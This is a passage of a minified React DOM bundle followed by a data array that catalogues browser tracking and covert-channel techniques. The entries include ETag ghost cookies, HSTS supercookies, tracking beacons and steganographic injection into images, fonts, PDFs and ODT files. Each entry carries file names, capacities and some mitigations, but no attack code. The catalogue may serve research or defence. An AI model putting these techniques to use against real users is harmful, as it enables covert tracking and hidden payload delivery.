a.href=="string"?(a=Ml(a.href),t=Wn(i).hoistableStyles,n=t.get(a),n||(n={type:"style",instance:null,count:0,state:null},t.set(a,n)),n):{type:"void",instance:null,count:0,state:null};case"link":if(a.rel==="stylesheet"&&typeof a.href=="string"&&typeof a.precedence=="string"){e=Ml(a.href);var s=Wn(i).hoistableStyles,u=s.get(e);if(u||(i=i.ownerDocument||i,u={type:"stylesheet",instance:null,count:0,state:{loading:0,preload:null}},s.set(e,u),(s=i.querySelector(Bi(e)))?s._p||(u.instance=s,u.state.loading=5):(s=Xt.get(e),s||(s={rel:"preload",as:"style",href:a.href,crossOrigin:a.crossOrigin,integrity:a.integrity,media:a.media,hrefLang:a.hrefLang,referrerPolicy:a.referrerPolicy},Xt.set(e,s)),Mb(i,e,s,u.state))),t&&n===null)throw Error(o(528,""));return u}if(t&&n!==null)throw Error(o(529,""));return null;case"script":return t=a.async,a=a.src,typeof a=="string"&&t&&typeof t!="function"&&typeof t!="symbol"?(a=Hl(a),t=Wn(i).hoistableScripts,n=t.get(a),n||(n={type:"script",instance:null,count:0,state:null},t.set(a,n)),n):{type:"void",instance:null,count:0,state:null};default:throw Error(o(444,e))}}function Ml(e){return'href="'+Ht(e)+'"'}function Bi(e){return'link[rel="stylesheet"]['+e+"]"}function Dp(e){return B({},e,{"data-precedence":e.precedence,precedence:null})}function Mb(e,t,a,n){if(t=e.querySelector('link[rel="preload"][as="style"]['+t+"]")){if(t[yr]!==!0){n.loading=1;return}}else t=e.createElement("link"),t[yr]=!0,t.onload=t.onerror=Xf.bind(null,t),st(t,"link",a),Je(t),e.head.appendChild(t);n.preload=t,t.addEventListener("load",function(){return n.loading|=1}),t.addEventListener("error",function(){return n.loading|=2})}function Hl(e){return'[src="'+Ht(e)+'"]'}function ki(e){return"script[async]"+e}function Up(e,t,a){if(t.count++,t.instance===null)switch(t.type){case"style":var n=e.querySelector('style[data-href~="'+Ht(a.href)+'"]');if(n)return t.instance=n,Je(n),n;var i=B({},a,{"data-href":a.href,"data-precedence":a.precedence,href:null,precedence:null});return n=(e.ownerDocument||e).createElement("style"),Je(n),st(n,"style",i),Cs(n,a.precedence,e),t.instance=n;case"stylesheet":i=Ml(a.href);var s=e.querySelector(Bi(i));if(s)return t.state.loading|=4,t.instance=s,Je(s),s;n=Dp(a),(i=Xt.get(i))&&Ou(n,i),s=(e.ownerDocument||e).createElement("link"),Je(s);var u=s;return u._p=new Promise(function(h,x){u.onload=h,u.onerror=x}),st(s,"link",n),t.state.loading|=4,Cs(s,a.precedence,e),t.instance=s;case"script":return s=Hl(a.src),(i=e.querySelector(ki(s)))?(t.instance=i,Je(i),i):(n=a,(i=Xt.get(s))&&(n=B({},a),Ru(n,i)),e=e.ownerDocument||e,i=e.createElement("script"),Je(i),st(i,"link",n),e.head.appendChild(i),t.instance=i);case"void":return null;default:throw Error(o(443,t.type))}else t.type==="stylesheet"&&(t.state.loading&4)===0&&(n=t.instance,t.state.loading|=4,Cs(n,a.precedence,e));return t.instance}function Cs(e,t,a){for(var n=a.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'),i=n.length?n[n.length-1]:null,s=i,u=0;u<n.length;u++){var h=n[u];if(h.dataset.precedence===t)s=h;else if(s!==i)break}s?s.parentNode.insertBefore(e,s.nextSibling):(t=a.nodeType===9?a.head:a,t.insertBefore(e,t.firstChild))}function Ou(e,t){e.crossOrigin==null&&(e.crossOrigin=t.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=t.referrerPolicy),e.title==null&&(e.title=t.title)}function Ru(e,t){e.crossOrigin==null&&(e.crossOrigin=t.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=t.referrerPolicy),e.integrity==null&&(e.integrity=t.integrity)}var zs=null;function Mp(e,t,a){if(zs===null){var n=new Map,i=zs=new Map;i.set(a,n)}else i=zs,n=i.get(a),n||(n=new Map,i.set(a,n));if(n.has(e))return n;for(n.set(e,null),a=a.getElementsByTagName(e),i=0;i<a.length;i++){var s=a[i];if(!(s[Wl]||s[at]||e==="link"&&s.getAttribute("rel")==="stylesheet")&&s.namespaceURI!=="http://www.w3.org/2000/svg"){var u=s.getAttribute(t)||"";u=e+u;var h=n.get(u);h?h.push(s):n.set(u,[s])}}return n}function Du(e,t,a){e=e.ownerDocument||e,e.head.insertBefore(a,t==="title"?e.querySelector("head > title"):null)}function Hb(e,t,a){if(a===1||t.itemProp!=null)return!1;switch(e){case"meta":case"title":return!0;case"style":if(typeof t.precedence!="string"||typeof t.href!="string"||t.href==="")break;return!0;case"link":if(typeof t.rel!="string"||typeof t.href!="string"||t.href===""||t.onLoad||t.onError)break;switch(t.rel){case"stylesheet":return e=t.disabled,typeof t.precedence=="string"&&e==null;default:return!0}case"script":if(t.async&&typeof t.async!="function"&&typeof t.async!="symbol"&&!t.onLoad&&!t.onError&&t.src&&typeof t.src=="string")return!0}return!1}function Hp(e,t){return e==="img"&&t.src!=null&&t.src!==""&&t.onLoad==null&&t.loading!=="lazy"}function Bp(e){return!(e.type==="stylesheet"&&(e.state.loading&3)===0)}function kp(e){return(e.width||100)*(e.height||100)*(typeof devicePixelRatio=="number"?devicePixelRatio:1)*.25}function Lp(e,t){typeof t.decode=="function"&&(e.imgCount++,t.complete||(e.imgBytes+=kp(t),e.suspenseyImages.push(t)),e=Lb.bind(e),t.decode().then(e,e))}function Bb(e,t,a,n){if(a.type==="stylesheet"&&(typeof n.media!="string"||matchMedia(n.media).matches!==!1)&&(a.state.loading&4)===0){if(a.instance===null){var i=Ml(n.href),s=t.querySelector(Bi(i));if(s){t=s._p,t!==null&&typeof t=="object"&&typeof t.then=="function"&&(e.count++,e=Li.bind(e),t.then(e,e)),a.state.loading|=4,a.instance=s,Je(s);return}s=t.ownerDocument||t,n=Dp(n),(i=Xt.get(i))&&Ou(n,i),s=s.createElement("link"),Je(s);var u=s;u._p=new Promise(function(h,x){u.onload=h,u.onerror=x}),st(s,"link",n),a.instance=s}e.stylesheets===null&&(e.stylesheets=new Map),e.stylesheets.set(a,t),(t=a.state.preload)&&(a.state.loading&3)===0&&(e.count++,a=Li.bind(e),t.addEventListener("load",a),t.addEventListener("error",a))}}var Os=0;function kb(e,t){return e.stylesheets&&e.count===0&&Ds(e,e.stylesheets),0<e.count||0<e.imgCount?function(a){var n=setTimeout(function(){if(e.stylesheets&&Ds(e,e.stylesheets),e.unsuspend){var s=e.unsuspend;e.unsuspend=null,s()}},6e4+t);0<e.imgBytes&&Os===0&&(Os=62500*ab());var i=setTimeout(function(){if(e.waitingForImages=!1,e.count===0&&(e.stylesheets&&Ds(e,e.stylesheets),e.unsuspend)){var s=e.unsuspend;e.unsuspend=null,s()}},(e.imgBytes>Os?50:800)+t);return e.unsuspend=a,function(){e.unsuspend=null,clearTimeout(n),clearTimeout(i)}}:null}function Gp(e){if(e.count===0&&(e.imgCount===0||!e.waitingForImages)){if(e.stylesheets)Ds(e,e.stylesheets);else if(e.unsuspend){var t=e.unsuspend;e.unsuspend=null,t()}}}function Li(){this.count--,Gp(this)}function Lb(){this.imgCount--,Gp(this)}var Rs=null;function Ds(e,t){e.stylesheets=null,e.unsuspend!==null&&(e.count++,Rs=new Map,t.forEach(Gb,e),Rs=null,Li.call(e))}function Gb(e,t){if(!(t.state.loading&4)){var a=Rs.get(e);if(a)var n=a.get(null);else{a=new Map,Rs.set(e,a);for(var i=e.querySelectorAll("link[data-precedence],style[data-precedence]"),s=0;s<i.length;s++){var u=i[s];(u.nodeName==="LINK"||u.getAttribute("media")!=="not all")&&(a.set(u.dataset.precedence,u),n=u)}n&&a.set(null,n)}i=t.instance,u=i.getAttribute("data-precedence"),s=a.get(u)||n,s===n&&a.set(null,i),a.set(u,i),this.count++,n=Li.bind(this),i.addEventListener("load",n),i.addEventListener("error",n),s?s.parentNode.insertBefore(i,s.nextSibling):(e=e.nodeType===9?e.head:e,e.insertBefore(i,e.firstChild)),t.state.loading|=4}}var Bl={$$typeof:_e,Provider:null,Consumer:null,_currentValue:ba,_currentValue2:ba,_threadCount:0};function qb(e,t,a,n,i,s,u,h,x){this.tag=1,this.containerInfo=e,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=dc(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=dc(0),this.hiddenUpdates=dc(null),this.identifierPrefix=n,this.onUncaughtError=i,this.onCaughtError=s,this.onRecoverableError=u,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=x,this.transitionTypes=null,this.incompleteTransitions=new Map}function qp(e,t,a,n,i,s,u,h,x,N,O,D){return e=new qb(e,t,a,u,x,N,O,D,h),t=1,s===!0&&(t|=24),s=vt(3,null,null,t),e.current=s,s.stateNode=e,t=Kc(),t.refCount++,e.pooledCache=t,t.refCount++,s.memoizedState={element:n,isDehydrated:a,cache:t},Pc(s),e}function Yp(e){return e?(e=ol,e):ol}function Zp(e,t,a,n,i,s){i=Yp(i),n.context===null?n.context=i:n.pendingContext=i,n=Ia(t),n.payload={element:a},s=s===void 0?null:s,s!==null&&(n.callback=s),a=Fa(e,n,t),a!==null&&(xt(a,e,t),gi(a,e,t))}function Xp(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var a=e.retryLane;e.retryLane=a!==0&&a<t?a:t}}function Uu(e,t){Xp(e,t),(e=e.alternate)&&Xp(e,t)}function Vp(e){if(e.tag===13||e.tag===31){var t=Tn(e,67108864);t!==null&&xt(t,e,67108864),Uu(e,67108864)}}function Qp(e){if(e.tag===13||e.tag===31){var t=Rt();t=hc(t);var a=Tn(e,t);a!==null&&xt(a,e,t),Uu(e,t)}}var kl=!0;function Yb(e,t,a,n){var i=I.T;I.T=null;var s=re.p;try{re.p=2,Mu(e,t,a,n)}finally{re.p=s,I.T=i}}function Zb(e,t,a,n){var i=I.T;I.T=null;var s=re.p;try{re.p=8,Mu(e,t,a,n)}finally{re.p=s,I.T=i}}function Mu(e,t,a,n){if(kl){var i=Hu(n);if(i===null)gu(e,t,n,Us,a),Ip(e,n);else if(Vb(i,e,t,a,n))n.stopPropagation();else if(Ip(e,n),t&4&&-1<Xb.indexOf(e)){for(;i!==null;){var s=$n(i);if(s!==null)switch(s.tag){case 3:if(s=s.stateNode,s.current.memoizedState.isDehydrated){var u=yn(s.pendingLanes);if(u!==0){var h=s;for(h.pendingLanes|=2,h.entangledLanes|=2;u;){var x=1<<31-Et(u);h.entanglements[1]|=x,u&=~x}da(s),(Ee&6)===0&&(bs=Tt()+500,Ri(0))}}break;case 31:case 13:h=Tn(s,2),h!==null&&xt(h,s,2),Ss(),Uu(s,2)}if(s=Hu(n),s===null&&gu(e,t,n,Us,a),s===i)break;i=s}i!==null&&n.stopPropagation()}else gu(e,t,n,null,a)}}function Hu(e){return e=_c(e),Bu(e)}var Us=null;function Bu(e){if(Us=null,e=bn(e),e!==null){var t=f(e);if(t===null)e=null;else{var a=t.tag;if(a===13){if(e=g(t),e!==null)return e;e=null}else if(a===31){if(e=y(t),e!==null)return e;e=null}else if(a===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null)}}return Us=e,null}function Kp(e){switch(e){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"fullscreenerror":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"resize":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(av()){case Rf:return 2;case Df:return 8;case hr:case nv:return 32;case Uf:return 268435456;default:return 32}default:return 32}}var ku=!1,cn=null,on=null,un=null,Gi=new Map,qi=new Map,fn=[],Xb="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function Ip(e,t){switch(e){case"focusin":case"focusout":cn=null;break;case"dragenter":case"dragleave":on=null;break;case"mouseover":case"mouseout":un=null;break;case"pointerover":case"pointerout":Gi.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":qi.delete(t.pointerId)}}function Yi(e,t,a,n,i,s){return e===null||e.nativeEvent!==s?(e={blockedOn:t,domEventName:a,eventSystemFlags:n,nativeEvent:s,targetContainers:[i]},t!==null&&(t=$n(t),t!==null&&Vp(t)),e):(e.eventSystemFlags|=n,t=e.targetContainers,i!==null&&t.indexOf(i)===-1&&t.push(i),e)}function Vb(e,t,a,n,i){switch(t){case"focusin":return cn=Yi(cn,e,t,a,n,i),!0;case"dragenter":return on=Yi(on,e,t,a,n,i),!0;case"mouseover":return un=Yi(un,e,t,a,n,i),!0;case"pointerover":var s=i.pointerId;return Gi.set(s,Yi(Gi.get(s)||null,e,t,a,n,i)),!0;case"gotpointercapture":return s=i.pointerId,qi.set(s,Yi(qi.get(s)||null,e,t,a,n,i)),!0}return!1}function Fp(e){var t=bn(e.target);if(t!==null){var a=f(t);if(a!==null){if(t=a.tag,t===13){if(t=g(a),t!==null){e.blockedOn=t,qf(e.priority,function(){Qp(a)});return}}else if(t===31){if(t=y(a),t!==null){e.blockedOn=t,qf(e.priority,function(){Qp(a)});return}}else if(t===3&&a.stateNode.current.memoizedState.isDehydrated){e.blockedOn=a.tag===3?a.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Ms(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var a=Hu(e.nativeEvent);if(a===null){a=e.nativeEvent;var n=new a.constructor(a.type,a);bc=n,a.target.dispatchEvent(n),bc=null}else return t=$n(a),t!==null&&Vp(t),e.blockedOn=a,!1;t.shift()}return!0}function Jp(e,t,a){Ms(e)&&a.delete(t)}function Qb(){ku=!1,cn!==null&&Ms(cn)&&(cn=null),on!==null&&Ms(on)&&(on=null),un!==null&&Ms(un)&&(un=null),Gi.forEach(Jp),qi.forEach(Jp)}function Hs(e,t){e.blockedOn===t&&(e.blockedOn=null,ku||(ku=!0,l.unstable_scheduleCallback(l.unstable_NormalPriority,Qb)))}var Bs=null;function Pp(e){Bs!==e&&(Bs=e,l.unstable_scheduleCallback(l.unstable_NormalPriority,function(){Bs===e&&(Bs=null);for(var t=0;t<e.length;t+=3){var a=e[t],n=e[t+1],i=e[t+2];if(typeof n!="function"){if(Bu(n||a)===null)continue;break}var s=$n(a);s!==null&&(e.splice(t,3),t-=3,bo(s,{pending:!0,data:i,method:a.method,action:n},n,i))}}))}function Ll(e){function t(x){return Hs(x,e)}cn!==null&&Hs(cn,e),on!==null&&Hs(on,e),un!==null&&Hs(un,e),Gi.forEach(t),qi.forEach(t);for(var a=0;a<fn.length;a++){var n=fn[a];n.blockedOn===e&&(n.blockedOn=null)}for(;0<fn.length&&(a=fn[0],a.blockedOn===null);)Fp(a),a.blockedOn===null&&fn.shift();if(a=(e.ownerDocument||e).$$reactFormReplay,a!=null)for(n=0;n<a.length;n+=3){var i=a[n],s=a[n+1],u=i[gt]||null;if(typeof s=="function")u||Pp(a);else if(u){var h=null;if(s&&s.hasAttribute("formAction")){if(i=s,u=s[gt]||null)h=u.formAction;else if(Bu(i)!==null)continue}else h=u.action;typeof h=="function"?a[n+1]=h:(a.splice(n,3),n-=3),Pp(a)}}}function $p(){function e(s){s.canIntercept&&s.info==="react-transition"&&s.intercept({handler:function(){return new Promise(function(u){return i=u})},focusReset:"manual",scroll:"manual"})}function t(){i!==null&&(i(),i=null),n||setTimeout(a,20)}function a(){if(!n&&!navigation.transition){var s=navigation.currentEntry;s&&s.url!=null&&navigation.navigate(s.url,{state:s.getState(),info:"react-transition",history:"replace"})}}if(typeof navigation=="object"){var n=!1,i=null;return navigation.addEventListener("navigate",e),navigation.addEventListener("navigatesuccess",t),navigation.addEventListener("navigateerror",t),setTimeout(a,100),function(){n=!0,navigation.removeEventListener("navigate",e),navigation.removeEventListener("navigatesuccess",t),navigation.removeEventListener("navigateerror",t),i!==null&&(i(),i=null)}}}function Lu(e){this._internalRoot=e}ks.prototype.render=Lu.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(o(409));var a=t.current,n=Rt();Zp(a,n,e,t,null,null)},ks.prototype.unmount=Lu.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;Zp(e.current,2,null,e,null,null),Ss(),t[Pn]=null}};function ks(e){this._internalRoot=e}ks.prototype.unstable_scheduleHydration=function(e){if(e){var t=Gf();e={blockedOn:null,target:e,priority:t};for(var a=0;a<fn.length&&t!==0&&t<fn[a].priority;a++);fn.splice(a,0,e),a===0&&Fp(e)}};var Wp=c.version;if(Wp!=="19.3.0")throw Error(o(527,Wp,"19.3.0"));re.findDOMNode=function(e){var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(o(188)):(e=Object.keys(e).join(","),Error(o(268,e)));return e=m(t),e=e!==null?v(e):null,e=e===null?null:e.stateNode,e};var Kb={bundleType:0,version:"19.3.0",rendererPackageName:"react-dom",currentDispatcherRef:I,reconcilerVersion:"19.3.0"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Ls=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Ls.isDisabled&&Ls.supportsFiber)try{Jl=Ls.inject(Kb),wt=Ls}catch{}}return Xi.createRoot=function(e,t){if(!d(e))throw Error(o(299));var a=!1,n="",i=Yh,s=Zh,u=Xh;return t!=null&&(t.unstable_strictMode===!0&&(a=!0),t.identifierPrefix!==void 0&&(n=t.identifierPrefix),t.onUncaughtError!==void 0&&(i=t.onUncaughtError),t.onCaughtError!==void 0&&(s=t.onCaughtError),t.onRecoverableError!==void 0&&(u=t.onRecoverableError)),t=qp(e,1,!1,null,null,a,n,null,i,s,u,$p),e[Pn]=t.current,mu(e),new Lu(t)},Xi.hydrateRoot=function(e,t,a){if(!d(e))throw Error(o(299));var n=!1,i="",s=Yh,u=Zh,h=Xh,x=null;return a!=null&&(a.unstable_strictMode===!0&&(n=!0),a.identifierPrefix!==void 0&&(i=a.identifierPrefix),a.onUncaughtError!==void 0&&(s=a.onUncaughtError),a.onCaughtError!==void 0&&(u=a.onCaughtError),a.onRecoverableError!==void 0&&(h=a.onRecoverableError),a.formState!==void 0&&(x=a.formState)),t=qp(e,1,!0,t,a??null,n,i,x,s,u,h,$p),t.context=Yp(null),a=t.current,n=Rt(),n=hc(n),i=Ia(n),i.callback=null,Fa(a,i,n),a=n,t.current.lanes=a,$l(t,a),da(t),e[Pn]=t.current,mu(e),new ks(t)},Xi.version="19.3.0",Xi}var om;function i1(){if(om)return Yu.exports;om=1;function l(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(l)}catch(c){console.error(c)}}return l(),Yu.exports=l1(),Yu.exports}var r1=i1();const cg=[{id:"fav-etag",reg:"BSC-001",name:"favicon.ico",sub:"ETag ghost cookie",cat:"BROWSER STATE",proj:"FFF",zone:"16",preview:"ico",vector:"passive",persist:"high",cap:"128 bit",mech:"If-None-Match header",files:[{n:"server.js",l:"js",id:"etag-srv"},{n:"middleware",t:"dir",ch:[{n:"etag.js",l:"js",id:"etag-mw"},{n:"logger.js",l:"js",id:"etag-log"}]},{n:"favicon.ico",l:"bin",id:"etag-ico"},{n:"dashboard",t:"dir",ch:[{n:"index.html",l:"html",id:"etag-dash"}]}],refs:["Favicon - Counter / Blueprint.txt","Trojan_Horse / OPERATION TROJAN FAVICON.txt"],mitigations:["ETag-stripping reverse proxy","Cache-Control: no-store"]},{id:"sw-cache",reg:"BSC-002",name:"sw.js",sub:"Cache API write channel",cat:"BROWSER STATE",proj:"BSCA",zone:"16",preview:"code",vector:"write",persist:"v.high",cap:"∞",mech:"Cache.put()/match()",files:[{n:"sw.js",l:"js",id:"sw-main"},{n:"probe.js",l:"js",id:"sw-probe"},{n:"register.js",l:"js",id:"sw-reg"}],refs:["BROWSER STATE CHANNEL ANALYSIS"],mitigations:["SW scope restriction","unregister-on-idle"]},{id:"hsts-super",reg:"BSC-003",name:"HSTS beacon",sub:"supercookie write channel",cat:"BROWSER STATE",proj:"BSCA",zone:"16",preview:"headers",vector:"passive",persist:"high",cap:"~30 bit",mech:"Strict-Transport-Security",files:[{n:"nginx.conf",l:"conf",id:"hsts-nginx"},{n:"probe.html",l:"html",id:"hsts-probe"},{n:"read.js",l:"js",id:"hsts-read"}]},{id:"ls-chan",reg:"BSC-004",name:"localStorage",sub:"persistent write channel",cat:"BROWSER STATE",proj:"BSCA",zone:"16",preview:"code",vector:"write",persist:"high",cap:"5 MB",mech:"setItem()/getItem()",files:[{n:"write.js",l:"js",id:"ls-write"},{n:"read.js",l:"js",id:"ls-read"},{n:"wipe.js",l:"js",id:"ls-wipe"}]},{id:"idb-chan",reg:"BSC-005",name:"IndexedDB",sub:"structured data channel",cat:"BROWSER STATE",proj:"BSCA",zone:"16",preview:"code",vector:"write",persist:"v.high",cap:"50+ MB",mech:"IDBTransaction",files:[{n:"channel.js",l:"js",id:"idb-chan-js"},{n:"schema.js",l:"js",id:"idb-schema"}]},{id:"opfs-chan",reg:"BSC-006",name:"OPFS",sub:"origin private file system",cat:"BROWSER STATE",proj:"BSCA",zone:"16",preview:"code",vector:"write",persist:"v.high",cap:"∞",mech:"FileSystemFileHandle",files:[{n:"opfs.js",l:"js",id:"opfs-js"},{n:"worker.js",l:"js",id:"opfs-worker"}]},{id:"sab-chan",reg:"BSC-007",name:"SharedArrayBuffer",sub:"timing side-channel",cat:"BROWSER STATE",proj:"BSCA",zone:"16",preview:"code",vector:"passive",persist:"none",cap:"~1 bit/cycle",mech:"Atomics.wait()/notify()",files:[{n:"timer.js",l:"js",id:"sab-timer"},{n:"worker.js",l:"js",id:"sab-worker"}]},{id:"etag-probe",reg:"BSC-008",name:"ETag probe",sub:"cache fingerprint (read-only)",cat:"BROWSER STATE",proj:"FFF",zone:"16",preview:"headers",vector:"passive",persist:"medium",cap:"32–64 bit",mech:"HTTP ETag round-trip",files:[{n:"probe.js",l:"js",id:"ep-probe"},{n:"server.js",l:"js",id:"ep-server"}]},{id:"bc-chan",reg:"BSC-009",name:"BroadcastChannel",sub:"cross-tab messaging",cat:"BROWSER STATE",proj:"BSCA",zone:"16",preview:"code",vector:"write",persist:"session",cap:"postMessage payload",mech:"BroadcastChannel API",files:[{n:"channel.js",l:"js",id:"bc-chan"},{n:"listener.js",l:"js",id:"bc-listen"}]},{id:"sw-shared",reg:"BSC-010",name:"SharedWorker",sub:"cross-origin shared context",cat:"BROWSER STATE",proj:"BSCA",zone:"16",preview:"code",vector:"write",persist:"v.high",cap:"postMessage + port",mech:"SharedWorker port",files:[{n:"worker.js",l:"js",id:"sw-shared-js"},{n:"connect.js",l:"js",id:"sw-shared-conn"}]},{id:"gif-pixel",reg:"TRK-001",name:".gif pixel",sub:"1×1 tracking beacon",cat:"TRACKING",proj:"GIF",zone:"03",preview:"pixel",vector:"passive",persist:"session",cap:"request metadata",mech:"img src / beacon",files:[{n:"pixel.py",l:"py",id:"gif-py"},{n:"server.py",l:"py",id:"gif-srv"},{n:"dashboard.html",l:"html",id:"gif-dash"}]},{id:"gif-anim",reg:"TRK-002",name:".gif animated",sub:"decoy carrier / tracker",cat:"TRACKING",proj:"GIF",zone:"03",preview:"pixel",vector:"passive",persist:"session",cap:"request + referer",mech:"frame timing + headers",files:[{n:"gen.py",l:"py",id:"anim-gen"},{n:"embed.py",l:"py",id:"anim-embed"}]},{id:"css-beacon",reg:"TRK-003",name:"CSS beacon",sub:"background-image tracker",cat:"TRACKING",proj:"BSCA",zone:"03",preview:"code",vector:"passive",persist:"session",cap:"selector match",mech:":visited / url() load",files:[{n:"probe.css",l:"css",id:"css-probe"},{n:"server.py",l:"py",id:"css-srv"}]},{id:"nav-beacon",reg:"TRK-004",name:"navigator.sendBeacon",sub:"async POST on unload",cat:"TRACKING",proj:"BSCA",zone:"03",preview:"code",vector:"write",persist:"session",cap:"64 KB payload",mech:"sendBeacon() API",files:[{n:"beacon.js",l:"js",id:"nb-js"},{n:"collect.py",l:"py",id:"nb-collect"}]},{id:"ws-beacon",reg:"TRK-005",name:"WebSocket beacon",sub:"bidirectional low-latency tracker",cat:"TRACKING",proj:"BSCA",zone:"03",preview:"code",vector:"write",persist:"session",cap:"persistent stream",mech:"WebSocket + ping frames",files:[{n:"client.js",l:"js",id:"ws-cli"},{n:"server.js",l:"js",id:"ws-srv"}]},{id:"mqtt-track",reg:"TRK-006",name:"MQTT beacon",sub:"pub/sub tracking over MQTT",cat:"TRACKING",proj:"FFF",zone:"03",preview:"code",vector:"write",persist:"session",cap:"topic subscriptions",mech:"MQTT publish/subscribe",files:[{n:"client.js",l:"js",id:"mqtt-cli"},{n:"broker.py",l:"py",id:"mqtt-broker"}]},{id:"res-hints",reg:"TRK-007",name:"Resource Hints",sub:"<link rel=preconnect> beacon",cat:"TRACKING",proj:"BSCA",zone:"03",preview:"code",vector:"passive",persist:"session",cap:"DNS lookup + TLS handshake",mech:"preconnect / prefetch",files:[{n:"hints.html",l:"html",id:"rh-html"},{n:"probe.js",l:"js",id:"rh-probe"}]},{id:"ntp-track",reg:"TRK-008",name:"NTP timing",sub:"clock-skew fingerprint",cat:"TRACKING",proj:"FFF",zone:"03",preview:"code",vector:"passive",persist:"high",cap:"~8 entropy bits",mech:"timestamp delta",files:[{n:"probe.js",l:"js",id:"ntp-probe"},{n:"server.js",l:"js",id:"ntp-srv"}]},{id:"png-lsb",reg:"STG-001",name:".png LSB",sub:"pixel least-significant-bit channel",cat:"STEGANOGRAPHY",proj:"Stegosaurus",zone:"08",preview:"pixel",vector:"write",persist:"high",cap:"~12.5% of pixels",mech:"LSB substitution per channel",files:[{n:"embed.ts",l:"ts",id:"png-embed"},{n:"extract.ts",l:"ts",id:"png-extract"},{n:"worker.ts",l:"ts",id:"png-worker"}]},{id:"gif-steg",reg:"STG-002",name:".gif stego",sub:"frame-delay covert channel",cat:"STEGANOGRAPHY",proj:"GIF",zone:"08",preview:"pixel",vector:"write",persist:"high",cap:"bits per frame delay",mech:"LZW + palette manipulation",files:[{n:"engine.py",l:"py",id:"gs-engine"},{n:"parser.py",l:"py",id:"gs-parser"},{n:"chaos.py",l:"py",id:"gs-chaos"}]},{id:"woff2-steg",reg:"STG-003",name:".woff2 font",sub:"glyph advance-width channel",cat:"STEGANOGRAPHY",proj:"Stegosaurus",zone:"08",preview:"code",vector:"write",persist:"high",cap:"~2 bit/glyph",mech:"hmtx table mutation",files:[{n:"font_steg.ts",l:"ts",id:"wf-embed"},{n:"extract.ts",l:"ts",id:"wf-extract"}]},{id:"pdf-meta",reg:"STG-004",name:".pdf metadata",sub:"XMP / trailer payload",cat:"STEGANOGRAPHY",proj:"Trojan",zone:"08",preview:"code",vector:"write",persist:"high",cap:"arbitrary",mech:"XMP sidecar + PDF stream",files:[{n:"inject.py",l:"py",id:"pdf-inject"},{n:"read.py",l:"py",id:"pdf-read"}]},{id:"odt-zip",reg:"STG-005",name:".odt ZIP",sub:"archive injection channel",cat:"STEGANOGRAPHY",proj:"Macro",zone:"08",preview:"code",vector:"write",persist:"high",cap:"arbitrary",mech:"ZIP extra field / hidden entry",files:[{n:"inject_odt.py",l:"py",id:"odt-py"},{n:"extract_odt.py",l:"py",id:"odt-ex"}]},{id:"wav-lsb",reg:"STG-006",name:".wav LSB",sub:"audio least-significant-bit",cat:"STEGANOGRAPHY",proj:"Stegosaurus",zone:"08",preview:"wave",vector:"write",persist:"high",cap:"~12.5% of samples",mech:"PCM sample LSB",files:[{n:"audio_steg.ts",l:"ts",id:"wav-embed"},{n:"extract.ts",l:"ts",id:"wav-ex"}]},{id:"webp-lsb",reg:"STG-007",name:".webp LSB",sub:"VP8/VP8L lossless LSB",cat:"STEGANOGRAPHY",proj:"Stegosaurus",zone:"08",preview:"pixel",vector:"write",persist:"high",cap:"~12.5% of pixels",mech:"VP8L transform LSB",files:[{n:"webp_embed.ts",l:"ts",id:"webp-emb"},{n:"extract.ts",l:"ts",id:"webp-ex"}]},{id:"avif-lsb",reg:"STG-008",name:".avif LSB",sub:"AV1 intra-frame LSB",cat:"STEGANOGRAPHY",proj:"Stegosaurus",zone:"08",preview:"pixel",vector:"write",persist:"high",cap:"~12.5% of pixels",mech:"AV1 YUV channel LSB",files:[{n:"avif_embed.ts",l:"ts",id:"avif-emb"},{n:"extract.ts",l:"ts",id:"avif-ex"}]},{id:"bmp-lsb",reg:"STG-009",name:".bmp LSB",sub:"raw pixel buffer LSB",cat:"STEGANOGRAPHY",proj:"Stegosaurus",zone:"08",preview:"pixel",vector:"write",persist:"high",cap:"~12.5% of pixels",mech:"BI_RGB pixel array 